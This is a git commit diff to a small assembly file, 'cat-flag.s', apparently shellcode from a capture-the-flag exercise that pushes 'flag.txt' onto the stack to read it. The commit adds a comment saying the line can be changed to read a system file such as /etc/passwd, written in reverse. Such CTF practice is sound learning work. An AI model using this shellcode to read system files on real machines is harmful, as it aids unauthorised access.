98d20cf81722e621340c1c1002b77b703bb06003
Andrew <58784803+andrewgll@users.noreply.github.com>
2022-10-25 03:05:54 +0300

    Update cat-flag.s

--- cat-flag.s
+++ cat-flag.s
@@ -4,7 +4,7 @@ _start:
 
 xor     rax, rax
 push    rax
-mov     rax, 0x7478742E67616C66 ;txt.galf
+mov     rax, 0x7478742E67616C66 ;txt.galf <--- modify this line to get something like /etc/password, don't fortget to do it in reverse!
 push    rax
 mov     rcx, rsp
 xor     rax, rax
